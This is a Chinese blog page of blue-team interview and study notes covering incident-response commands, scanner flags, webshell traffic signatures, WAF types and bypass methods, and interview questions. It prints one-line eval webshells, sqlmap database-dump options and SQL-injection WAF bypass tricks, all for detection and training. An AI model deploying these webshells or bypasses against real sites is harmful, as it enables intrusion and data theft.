+<p><code>tasklist /v</code> 查看远程主机的进程列表</p>
+<p><code>tasklist /S ip /v</code> 显示具体的服务信息（包括二进制路径和运行使用） sc qc Spooler</p>
+<p><strong>Linux应急响应</strong></p>
+<p><code>cat /etc/passwd#</code> 查看用户信息文件</p>
+<p><code>cat /etc/shadow#</code> 查看影子文件</p>
+<p><code>awk -F: &#39;$3==0&#123;print $1&#125;&#39; /etc/passwdcat /etc/passwd | grep x:0#</code> 查看系统是否还存在其他的特权账户，uid为0，默认系统只存在root一个特权账户</p>
+<p><code>who#</code>查看当前登录用户，以及其登录ip。pts代表远程登录，tty代表本地登陆。</p>
+<p><code>uptime#</code>查看现在的时间、系统开机时长、目前多少用户登录，系统在过去的1分钟、5分钟  和15分钟内的平均负载。</p>
+<p><code>stat /etc/passwd#</code>查看密码文件上一次修改的时间，如果最近被修改过，那就可能存在问题。</p>
+<p><code>cat /etc/passwd | grep -v nologin#</code>查看除了不可登录以外的用户都有哪些，有没有新增的</p>
+<p><code>cat /etc/passwd | grep /bin/bash#</code>查看能用bash shell登录的用户。</p>
+<p><code>history#</code>查看历史命令</p>
+<p><code>cat .bash_history &gt;&gt;history.txt#</code>保存历史命令</p>
+<p><code>netstat -pantu#</code>查看端口开放和连接情况</p>
+<p><code>ps -aux#</code>查看进程</p>
+<p><code>ps -aux | grep pid#</code>查看关联进程</p>
+<p><code>ps aux --sort=pcpu | head -10#</code>查看cpu占用率前十的进程</p>
+<p><code>systemctl list-unit-files | grep enabled#</code>查看开机启动项</p>
+<p><code>Crontab -l#</code>查看定时任务</p>
+<p><code>top#</code>进程动态监控</p>
+<p><code>ps -ef#</code>静态监控</p>
+<p><code>grep &quot;Failed password for root&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more#</code>统计爆破主机root账号的失败次数及ip：</p>
+<p><code>grep &quot;Accepted &quot; /var/log/secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</code>查看成功登录的日期、用户名、IP：</p>
+<p><code>stat /bin/netstat</code>  查看命名修改时间，防止被替换</p>
+<h5 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a><strong>溯源</strong></h5><ol>
+<li><strong>日志分析：</strong> 通过分析系统和网络日志，追踪安全事件的发生过程，识别攻击者的行为轨迹。</li>
+<li><strong>网络流量分析：</strong> 分析网络流量数据，了解攻击者的入侵路径和攻击方式，帮助追踪攻击来源和目标。</li>
+<li><strong>数字取证技术：</strong> 使用数字取证技术收集和分析证据，重建安全事件的过程，帮助溯源攻击者的身份和活动轨迹。</li>
+<li><strong>威胁情报分析：</strong> 获取和分析威胁情报，了解已知攻击者的行为特征和攻击手法，帮助识别和溯源未知攻击者。</li>
+</ol>
+<h4 id="安全工具"><a href="#安全工具" class="headerlink" title="安全工具"></a>安全工具</h4><h5 id="1-sqlmap"><a href="#1-sqlmap" class="headerlink" title="1.sqlmap"></a>1.sqlmap</h5><h6 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h6><p>-r </p>
+<p>-u 网址 </p>
+<p>–data “id”  </p>
+<p>–cookie  </p>
+<p>–proxy 代理  </p>
+<p>–tamper 绕过脚本 </p>
+<p>–level 等级</p>
+<h6 id="sqlmap脱裤用哪个参数"><a href="#sqlmap脱裤用哪个参数" class="headerlink" title="sqlmap脱裤用哪个参数"></a>sqlmap脱裤用哪个参数</h6><p>–dump 导出内容    </p>
+<p>-u 检测是否是注入点</p>
+<p>–dbs 跑所有库名  </p>
+<p>–current-db 跑当前数据库</p>
+<p>–tables -D 库名  （跑所有表） </p>
+<p>–columns -D 库名 -T 表名 （跑列） –dump跑内容</p>
+<h6 id="sqlmap跑post数据包"><a href="#sqlmap跑post数据包" class="headerlink" title="sqlmap跑post数据包"></a>sqlmap跑post数据包</h6><p>把post数据包放到一个txt文档里面（burp），使用-r参数跑</p>
+<h5 id="2-nmap"><a href="#2-nmap" class="headerlink" title="2.nmap"></a>2.nmap</h5><p><strong>-sS</strong>: 	TCP SYN 扫描，也称为半开放扫描。</p>
+<p><strong>-sT</strong>: 	TCP 连接扫描，也称为全连接扫描。</p>
+<p><strong>-sn:</strong>         Ping扫描-禁用端口扫描,主机发现</p>
+<p><strong>-iL:</strong>          从文件中加载IP地址</p>
+<p><strong>-sL:</strong>         简单的扫描目标</p>
+<p><strong>-sU</strong>: 	UDP 扫描，用于发现目标主机上运行的 UDP 服务。</p>
+<p><strong>-sV</strong>:	  服务版本检测，用于探测目标主机上运行的服务及其版本信息。</p>
+<p><strong>-O</strong>:	   操作系统检测，用于尝试识别目标主机的操作系统类型及版本。</p>
+<p><strong>-p</strong>: 	   指定要扫描的端口范围，例如 -p 1-100 表示扫描 1 到 100 端口。</p>
+<p><strong>-A</strong>: 	   激进扫描模式，相当于同时启用服务版本检测、操作系统检测、脚本扫描等选项。</p>
+<p><strong>–script</strong>:  指定要执行的 Nmap 脚本，用于执行自定义的漏洞扫描和服务识别。</p>
+<p><strong>-T</strong>: 	   设置扫描速度&#x2F;时序，可选值包括 0-5。</p>
+<p><strong>-iL</strong>: 	  从文件中读取目标主机列表进行扫描。</p>
+<p><strong>-f:</strong>             报文分段</p>
+<p><strong>-s:</strong>             欺骗源地址</p>
+<p><strong>-g :</strong>            使用指定的本机端口</p>
+<p><strong>-top-ports</strong>: 指定要扫描的常见端口数量，例如 –top-ports 100 表示扫描前100个常见端口。</p>
+<h5 id="3-Wireshark"><a href="#3-Wireshark" class="headerlink" title="3.Wireshark"></a>3.Wireshark</h5><h6 id="捕获过滤器："><a href="#捕获过滤器：" class="headerlink" title="捕获过滤器："></a>捕获过滤器：</h6><p>捕获过滤器用于在捕获数据包时指定只捕获符合条件的数据包。</p>
+<ul>
+<li><p><strong>host <ip_address></strong>: 捕获特定IP地址的数据包。</p>
+</li>
+<li><p><strong>net &lt;ip_address&#x2F;netmask&gt;</strong>: 捕获特定网络范围内的数据包。</p>
+</li>
+<li><p><strong>port <port_number></strong>: 捕获特定端口的数据包。</p>
+</li>
+<li><p><strong>tcp</strong>: 捕获TCP协议的数据包。</p>
+</li>
+<li><p><strong>udp</strong>: 捕获UDP协议的数据包。</p>
+</li>
+<li><p><strong>icmp</strong>: 捕获ICMP协议的数据包。</p>
+</li>
+</ul>
+<h6 id="显示过滤器："><a href="#显示过滤器：" class="headerlink" title="显示过滤器："></a>显示过滤器：</h6><p>显示过滤器用于在Wireshark中显示数据包时指定只显示符合条件的数据包。</p>
+<ul>
+<li><p><strong>ip.addr &#x3D;&#x3D; <ip_address></strong>: 显示特定IP地址的数据包。</p>
+</li>
+<li><p><strong>tcp.port &#x3D;&#x3D; <port_number></strong>: 显示特定TCP端口的数据包。</p>
+</li>
+<li><p><strong>udp.port &#x3D;&#x3D; <port_number></strong>: 显示特定UDP端口的数据包。</p>
+</li>
+<li><p><strong>frame.number <number></strong>: 显示特定帧编号的数据包。</p>
+</li>
+<li><p><strong>http</strong>: 显示HTTP协议的数据包。</p>
+</li>
+<li><p><strong>dns</strong>: 显示DNS协议的数据包。</p>
+</li>
+<li><p><strong>contains</strong> 123:过滤出包含123字段的包</p>
+</li>
+</ul>
+<h5 id="4-Dirsearch"><a href="#4-Dirsearch" class="headerlink" title="4.Dirsearch"></a>4.Dirsearch</h5><p>Dirsearch是一个用于扫描Web服务器目录和文件的常用工具，它可以帮助发现网站中隐藏的目录和文件，有助于进行安全评估和渗透测试。以下是Dirsearch常用的参数：</p>
+<p>**-u, –url <URL>**：指定目标URL，例如<code>-u http://example.com</code>。</p>
+<p>**-e, –extensions <EXTENSIONS>**：指定要搜索的文件扩展名，例如<code>-e php,txt</code>。</p>
+<p>**-w, –wordlist <WORDLIST>**：指定自定义的字典文件用于搜索目录和文件名，例如</p>
+<p>​        <code>-w custom_wordlist.txt</code>。</p>
+<p>**-x, –exclude-statuses <CODES>**：指定要排除的HTTP状态码，例如<code>-x 404,500</code>。</p>
+<p><strong>-r, –recursive</strong>：递归地搜索子目录。</p>
+<p>**-t, –threads <THREADS>**：指定线程数，加快扫描速度，例如<code>-t 20</code>。</p>
+<p><strong>-f, –full-url</strong>：显示完整的URL路径。</p>
+<p><strong>-b, –brute</strong>：尝试猜测目录和文件名。</p>
+<p>**-x, –exclude-ext <EXTENSIONS>**：排除指定的文件扩展名。</p>
+<p>**-r, –recursive-depth <DEPTH>**：指定递归搜索的深度。</p>
+<p>**-i, –input-domain <DOMAIN>**：输入要搜索的域名。</p>
+<p>**-l, –cookie <COOKIE>**：设置请求时的Cookie。</p>
+<p>**-H, –header <HEADER>**：添加自定义的HTTP头。</p>
+<p>**-P, –proxy <PROXY>**：设置代理，例如<code>-P http://127.0.0.1:8080</code>。</p>
+<p>**-o, –output <OUTPUT>**：将结果保存到文件中，例如<code>-o output.txt</code>。</p>
+<h4 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h4><h5 id="1-webshell工具"><a href="#1-webshell工具" class="headerlink" title="1.webshell工具"></a>1.webshell工具</h5><h6 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h6><ul>
+<li><p>静态特征</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">蚁剑shell后面中,php使用assert、eval执行；asp只有eval执行；在jsp使用的是Java类加载（ClassLoader），同时会带有base64编码解码等字符特征。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>动态特征</p>
+<ol>
+<li>我们使用一句话木马上传webshell，抓包后会发现每个请求体都存在以<code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0)开头。</code>并且响应体的返回结果是base64编码发混淆字符，格式为：<code>随机数 结果 随机数</code>,去除混淆字符（随机数）后进行base64解码后结果的格式为：<code>随机数 解码后的结果 随机数</code>,观察payload可以发现攻击行为。</li>
+<li>蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以<code>“_0x.....=”</code>这种形式（下划线可替换为其他）所以，以_0x开头的参数名，后面为加密数据的数据包也可识别为蚁剑的流量特征。</li>
+</ol>
+</li>
+</ul>
+<h6 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h6><ul>
+<li><p>2.0:</p>
+<ul>
+<li>使用<code>AES加密 + base64编码</code>，AES使用动态密钥对通信进行加密，进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。因此当发现一个ip的请求头中的user-agent在频繁变换，就可能是冰蝎。</li>
+</ul>
+</li>
+<li><p>3.0:</p>
+<ol>
+<li>使用<code>AES加密 + base64编码</code>,取消了2.0的动态获取密钥，使用固定的连接密钥，AES加密的密钥为<code>webshell连接密码的MD5的前16位，默认连接密码是&quot;rebeyond&quot;(即密钥是md5(&#39;rebeyond&#39;)[0:16]=e45e329feb5d925b)。</code>进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。因此当发现一个ip的请求头中的user-agent在频繁变换，就可能是冰蝎。</li>
+<li>jsp的webshell的请求数据包中的<code>content-type</code>字段常见为<code>application/octet-stream</code>。</li>
+<li>如果冰蝎密码不对，会出现两个连接，第一个是post 第二个是get</li>
+</ol>
+</li>
+<li><p>4.0:</p>
+<ul>
+<li>提供了传输协议自定义的功能，不再有连接密码的概念，自定义传输协议的算法就是连接密码。</li>
+<li><code>Accept</code>字段（弱特征），通常是<code>Accept: application/json, text/javascript, */*; q=0.01</code> 意思是浏览器可接受任何文件，但最倾向<code>application/json 和 text/javascript</code>。</li>
+<li><code>Content-Type</code>字段（弱特征），通常是<code>Content-type: Application/x-www-form-urlencoded</code></li>
+<li>与冰蝎的前述版本相似，进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。</li>
+<li>连接的端口有一定的特征，冰蝎与webshell建立连接的同时，java也与目的主机建立tcp连接，每次连接使用本地端口在49700左右(就是比较大的端口)，每连接一次，每建立一次新的连接，端口就依次增加。</li>
+<li>使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有<code>Connection：Keep-Alive</code></li>
+<li>有固定的请求头和响应头，请求字节头：<code>dFAXQV1LORcHRQtLRlwMAhwFTAg/M</code> ，响应字节头：<code>TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd</code></li>
+<li>默认时，冰蝎 webshell都有<code>e45e329feb5d925b</code> 一串密钥，与冰蝎3.0相同。</li>
+</ul>
+</li>
+</ul>
+<h6 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h6><ul>
+<li><p>静态特征:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在默认脚本编码的情况下，jsp会出现`xc、pass字符和Java反射(ClassLoader，getClass().getClassLoader())，base64加解码`等特征。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>动态特征:</p>
+<ul>
+<li><p>User-Agent字段（弱特征），如果采用默认的情况，会暴露使用的jdk信息。不过哥斯拉支持自定义HTTP头部，这个默认特征是可以很容易去除的。</p>
+</li>
+<li><p>Accept字段（弱特征），默认是<code>Accept:text/html, image/gif, image/jpeg, *; q=.2, /; q=.2。</code>同上，这个也可修改，只能作为辅助检测的特征。</p>
+</li>
+<li><p><code>Cookie中有一个非常关键的特征，最后会有个分号</code>。估计后续的版本会修复。</p>
+<p><img src="https://s2.loli.net/2024/03/23/TEFDkwitnNAZVph.png" alt="image-20240323160217538"></p>
+</li>
+<li><p>响应体的数据有一定特征，哥斯拉会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分。整个响应包的结构体征为：md5前十六位+base64+md5后十六位。</p>
+</li>
+<li><p>长度固定：哥斯拉4.0.1使用JAVA_AES_BASE64算法对数据进行加密后，加密后数据的长度是固定的因此，可以根据攻击流量的长度是否固定来判断是否为哥斯拉</p>
+</li>
+</ul>
+</li>
+</ul>
+<h6 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h6><ul>
+<li><p>静态特征:</p>
+<p>菜刀使用一句话木马，特征十分明显，在PHP、ASP、ASP.NET的网站都可以：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP:  <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>([<span class="variable">$_post</span>[<span class="string">&#x27;test&#x27;</span>]]); <span class="meta">?&gt;</span></span><br><span class="line">ASP:  &lt;% <span class="keyword">eval</span> <span class="title function_ invoke__">request</span>(<span class="string">&quot;test&quot;</span>)%&gt;</span><br><span class="line">ASP.NET:  &lt;%@ Page Language=<span class="string">&quot;Javascript&quot;</span>%&gt;&lt;% <span class="keyword">eval</span>(Request.Item[<span class="string">&quot;test&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>动态特征:</p>
+<ul>
+<li><p><code>User-Agent:</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">百度: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">火狐: Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>payload在请求体中，采用url编码+base64编码，payload部分是明文传输。</p>
+</li>
+<li><p>payload中有eval或assert、base64_decode这样的字符。</p>
+</li>
+<li><p>payload中有默认固定的<code>&amp;z0=QGluaV9zZXQ...</code>这样base64加密的攻击载荷，参数z0对应<code>$_POST[z0]</code>接收到的数据，且固定为<code>QGluaV9zZXQ</code>开头。进行base64解码后可看到代码：<code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);</code>这段意思是首先关闭报错和magic_quotes，接下来去获取主机的信息。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h5><ul>
+<li>先判断是通过什么方法注入的内存马，可以先查看web日志是否有可疑的web访问日志如果是filter或者listener类型就会有<strong>大量url请求路径相同参数不同的，或者页面不存在但是返回200的</strong>，查看是否有类似哥斯拉、冰蝎相同的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合通过查找<strong>返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马</strong>如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看是否有可疑的报错，根据注入时间和方法根据-业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。</li>
+</ul>
+<h5 id="2-web漏洞扫描器"><a href="#2-web漏洞扫描器" class="headerlink" title="2.web漏洞扫描器"></a>2.web漏洞扫描器</h5><p><a target="_blank" rel="noopener" href="https://rce.moe/2022/11/06/portscantoolsanalyse/">常见安全工具的扫描流量特征分析与检测 - 白帽酱の博客 (rce.moe)</a></p>
+<h6 id="Xray"><a href="#Xray" class="headerlink" title="Xray"></a>Xray</h6><h6 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h6><h6 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h6><h6 id="APPScan"><a href="#APPScan" class="headerlink" title="APPScan"></a>APPScan</h6><h6 id="GOBY"><a href="#GOBY" class="headerlink" title="GOBY"></a>GOBY</h6><h4 id="安全设备"><a href="#安全设备" class="headerlink" title="安全设备"></a>安全设备</h4><h5 id="1-waf"><a href="#1-waf" class="headerlink" title="1.waf"></a>1.waf</h5><p>分类:</p>
+<ul>
+<li>硬件Waf通常的安装方式是将Waf串行部署在Web服务器前端，用于检测、阻断异常流量。<ul>
+<li>绿盟</li>
+<li>启明星辰</li>
+<li>玄武盾—安恒云</li>
+<li>创宇盾—知道创宇</li>
+<li>天融信</li>
+</ul>
+</li>
+<li>软件Waf则是安装在需要防护的服务器上，实现方式通常是Waf监听端口或以Web容器扩展方式进行请求检测和阻断。<ul>
+<li>云锁—椒图科技</li>
+<li>云磐—安全狗</li>
+<li>雷池社区版—长亭科技</li>
+<li>D盾—迪元素科技</li>
+<li>南墙—有安科技</li>
+</ul>
+</li>
+<li>云WAF，也称WEB应用防火墙的云模式，这种模式让用户不需要在自己的网络中安装软件程序或部署硬件设备，就可以对网站实施安全防护，它的主要实现方式是利用DNS技术，通过移交域名解析权来实现安全防护。<ul>
+<li>护卫神—腾讯云</li>
+<li>安骑士—阿里云</li>
+<li>腾讯网站管家</li>
+</ul>
+</li>
+</ul>
+<h6 id="一些WAF绕过方法（以注入为主）"><a href="#一些WAF绕过方法（以注入为主）" class="headerlink" title="一些WAF绕过方法（以注入为主）"></a>一些WAF绕过方法（以注入为主）</h6><p>1.大小写绕过<br>        比如waf拦截union select，可以构造Union sElEcT来绕过。</p>
+<p>2.特殊字符替换空格或注释绕过<br>        可以用注释来替代空格进行绕过，有些waf在检测时不会识别注释或者将注释替换掉，如sqlserver中可以用&#x2F;**&#x2F;代替空格，在mysql中 %0a 是换行，可以		代替空格。如union select 1,2可转换为union&#x2F;<em>xx</em>&#x2F;select&#x2F;<em>xx</em>&#x2F;1,2</p>
+<p>3.编码绕过<br>        少数waf不会对普通字符进行URL解码,还有一部分waf只会进行一次url解码，所以可以对payload进行二次url编码。常见的SQL编码有unicode、HEX、		URL、ascll、base64等，XSS编码有：HTML、URLASCII、JS编码、base64等等。如 union select 1,2可对其进行url编码后进行绕过waf。</p>
+<p>4.关键字替换绕过<br>        有些WAF会删除或者替换关键字，如遇到select union等敏感字词。<br>        如 union select 1,2,3可替换为ununionion selselectect 1,,2,3</p>
+<p>5.多请求拆分绕过<br>        对于多个参数的语句，可以将注入语句分割插入。<br>        如这样的请求：?a&#x3D;[inputa]&amp;b&#x3D;[inputb]可将参数a和b拼接如：and a&#x3D;[inputa] and b&#x3D;[inputb]</p>
+<p>6.利用cookies绕过<br>        对于用了$_REQUEST来获取参数的网站可以尝试将payload放在cookie中进行绕过REQUEST会依次从GET POST cookie中获取参数，如果WAF只检测了		GET&#x2F;POST而没有检测cookie，可以将语句放在cookie中进行绕过。</p>
+<p>7.云WAF绕过之寻找网站源ip<br>        采用云WAF的网站可以寻找网站真实ip来绕过云WAF的检测。<br>        常见方法有：</p>
+<p>​		– 采用多地ping的方法查看ip地址解析分析真实ip<br>​			– 在线ping网站有：<br>​				<a target="_blank" rel="noopener" href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br>​				<a target="_blank" rel="noopener" href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br>​				<a target="_blank" rel="noopener" href="https://www.ipdatacloud.com/">https://www.ipdatacloud.com/</a><br>​			– 使用 nslookup(命令行下的网络工具)命令查询DNS记录(NS记录) 进行检测，原理同上。<br>​			– 寻找网站历史解析记录(web.archinve.org–互联网档案馆)。<br>​			– 找网站的二级域名(搜索引擎的缓存,网络爬虫,网站的历史记录,第三方工具[domaintools.com 和 zoominfo.com ])、NS、MX记录等对应的ip。<br>​			– 订阅网站邮件，查看邮件发送方的ip。</p>
+<h5 id="2-蜜罐"><a href="#2-蜜罐" class="headerlink" title="2.蜜罐"></a>2.蜜罐</h5><p>分类: </p>
+<p>1.数据库蜜罐、Web蜜罐、服务蜜罐</p>
+<p>2.低交互、高交互、粘性蜜罐(有蜜饵可锁定攻击者)、现代密网(MHN开源软件，简化了蜜罐的部署，	同时便于收集和统计蜜罐的数据)</p>
+<p>开源蜜罐: HFish,DecoyMini</p>
+<h5 id="3-态势感知"><a href="#3-态势感知" class="headerlink" title="3.态势感知"></a>3.态势感知</h5><h5 id="4-IDS-IPS"><a href="#4-IDS-IPS" class="headerlink" title="4.IDS&#x2F;IPS"></a>4.IDS&#x2F;IPS</h5><h2 id="面试："><a href="#面试：" class="headerlink" title="面试："></a>面试：</h2><h2 id="Hvv蓝队常见面试题3"><a href="#Hvv蓝队常见面试题3" class="headerlink" title="Hvv蓝队常见面试题3"></a>Hvv蓝队常见面试题3</h2><p>1、waf一般原理  2、HTTP头部的server字段的值有哪些信息  3、:Log4j2反序列化原理  4、未授权访问漏洞  5、xxe漏洞原理  6、Weblogic SSRF漏洞(CVE-2014-4210)利用过程  7、:IIS中间件PUT文件写入的修复建议  8、:strust2攻击特征有哪些  9、strust2的特征  10、:fastjson的1.2.42版本，payload做了哪些变动  11、如何判断是否使用了fastison组件  12、客户部署的WAF和天眼，流量先过WAF再进天眼，这种情况下天眼告警中源ip是waf的ip，这是什么  13、告警中发现源是DNS设备，告警类型是木马病毒等，这是因为什么，用不用关注  14、命令执行的告警，怎么判断是不是误报  15、:攻击ip为负载地址那怎么找源ip  16、Windows疑似被挖矿，你的排查思路是什么  17、linux的计划任务怎么查看?拼出来  18、为什么组织会使用蜜罐?  19、使用天眼如何查看日志</p>
+<p>TCP三次握手了解吗？ xff是干什么的？ 401状态码 301状态码 500状态码 sql注入的二次注入原理 sql注入的都读写应用条件 sql注入修复&#x2F;防御 get请求和POST请求的区别 xss和csrf的区别 执行函数有什么？ xxe盲注利用方法有哪些？ 有没有挖过漏洞 有哪些中间件框架漏洞 p开头的什么反序列化(没听过) 正向正向代理的区别 内网提权 用过什么设备 怎么判断dnslog盲注怎么判断成功吗？ 溯源反制 win的dos和Linux命令 Windows，linux查看进程命令 流量分析问题 识别cs，哥斯拉冰蝎的流量特征 内存马这块有了解吗？ 有或者实际工作中有没有遇到过那个有钓鱼邮件，比如微信群说有0day什么的这个情况？ 客户问技术型问题，你要是不会，怎么解决？</p>
+<p>先借口有事然后和客户约一个时间答复。然后利用这个时间去查或者找同事求助 远程协助等等</p>
+<ul>
+<li>1.以前有参加过吗：个人经历信息。</li>
+<li>2.注入有哪些：SQL注入、命令注入、LDAP注入等。</li>
+<li>3.sql注入哪些类型：SQL注入类型包括联合查询注入、布尔盲注、时间盲注、错误盲注等。</li>
+<li>4.sql时间盲注用的函数：MySQL中使用的函数可能包括sleep()、if()等。</li>
+<li>5.ssrf能干什么：SSRF（Server-Side Request Forgery）可以发起请求到内部网络或外部网络。</li>
+<li>6.JWT：JSON Web Token，用于身份验证和信息交换。</li>
+<li>7.fastjson payload的特征：Fastjson payload特征可能包括特殊的类名、方法调用等。</li>
+<li>8.fastjson这个@type在java中是啥：在Java中，@type通常用于指定JSON对象的类型。</li>
+<li>9.shiro原理：Shiro是一个Java安全框架，用于身份验证、授权、加密和会话管理。</li>
+<li>10.struts 2的特征：Struts 2是一个Java EE的Web应用框架，支持MVC模式。</li>
+<li>11.sql注入成功了的特征：可能包括返回异常信息、数据库错误信息、数据泄露等。</li>
+<li>12.文件上传成功了的特征：可能包括文件上传成功提示、文件在服务器上的存储等。</li>
+<li>13.内打内如何排查：可能指的是内部攻击的排查，需要检查日志、审计系统等。</li>
+<li>14.负载均衡的告警如何判断ip：通过负载均衡的日志和告警信息来识别异常IP。</li>
+<li>15.应急响应：应急响应是指在发生安全事件时采取的紧急措施。具体根据自己</li>
+<li>16.溯源反制：溯源反制是指追踪攻击源并采取措施进行反制。具体根据自己</li>
+</ul>
+<h2 id="Hvv蓝队常见面试题4"><a href="#Hvv蓝队常见面试题4" class="headerlink" title="Hvv蓝队常见面试题4"></a>Hvv蓝队常见面试题4</h2><p><strong>0x01 Hvv的分组和流程</strong></p>
+<p>HW分为蓝队和红队，红队为常说的攻击队，蓝队为防守队。蓝队一般分为初级监测组，中级研判组，高级应急溯源组；</p>
+<p>流程介绍：一般开始前会进行资产梳理，并通过漏洞扫描，渗透测试以及基线检查等做一些自查，一是可以减少暴漏面，二是减少一些风险点。有些厂商还会利用几天的时间进行一次内部演练，及时发现疏忽处并进行相应整改；</p>
+<p>作为一个新手小白，主要做的就是坚守岗位，监测与甲方合作的安全厂商的一些监测设备，进行日志分析、IP封堵等，其实这些都没有什么技术含量，懂web安全和渗透测试基础的基本一看就会熟悉了，当然，部分厂商会对自己的合作伙伴们进行短期的产品培训。</p>
+<p><strong>0x02 面试方面</strong></p>
+<p>关于面试，最重要的还是自己的技能以及理论基础，有一些中间商会让你把简历做的漂亮一些，把各种项目、挖洞经验都写进去，但意义不大，如果自己没有掌握这些，面试官一两句话就知道你的级别了。所以对于小白，要抱着学习的心态以及端正的态度。当然，对心理素质以及表达能力也是一种考验。</p>
+<p><strong>1.经验类型题：</strong></p>
+<p>（1）有没有护网经历？</p>
+<p>（2）参与过哪些项目？</p>
+<p>（3）看过哪些设备？</p>
+<p>（4） …….</p>
+<p>（这类题主要谈经验，没有的话一般会被定到初级(除非技术非常nice)，把自己对安全设备的了解以及了解的HW事项尽可能多的表达出来，并表示自己已经做了充足的准备就好了）</p>
+<p>监控组人员需要懂得一些常见的安全设备，如奇安信天眼、启明星辰IPS等</p>
+<p><strong>2.研判类型题：</strong></p>
+<p><strong>（1）怎么确定是真实攻击还是误报？</strong></p>
+<ul>
+<li>通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报</li>
+<li>以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。</li>
+<li>查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。</li>
+<li>本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。</li>
+</ul>
+<p><strong>（2）常见的端口以及入侵方式</strong></p>
+<p><img src="https://s2.loli.net/2024/04/12/cBkLsg3tvhM85NZ.png" alt="https://mmbiz.qpic.cn/mmbiz_png/RR4TjsSzEBzlIy6drKS9n8u9sPIibhAoRqACobUeNgSolyETicP5kuGUcxtHApvJAheO6OkDW1sXbX6ZNa3Opjibw/640?wx_fmt=png&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1"></p>
+<p><strong>（3）常用的Webshell检测工具</strong></p>
+<ul>
+<li>D盾</li>
+<li>河马WEBSHELL</li>
+<li>Web shell Detector</li>
+<li>PHP Malware Finder</li>
+</ul>
+<p><strong>（4）struts2命令执行的流量特征</strong></p>
+<p>一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。</p>
+<p><strong>（5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？</strong></p>
+<ul>
+<li>一般webshell文件名后缀为jsp、php、py、asp等；</li>
+<li>上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。</li>
+<li>由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等</li>
+<li>一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。</li>
+</ul>
+<p><strong>（6）Liunx系统中任何权限都能访问的临时文件位置</strong></p>
+<p>答：&#x2F;var&#x2F;tmp</p>
+<p><strong>（7）如何判断是钓鱼邮件</strong></p>
+<ul>
+<li>以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。</li>
+<li>看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来</li>
+<li>附件放到沙箱里 看看是否有问题</li>
+<li>有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了</li>
+</ul>
+<p><strong>（8）WAF和IPS的区别</strong></p>
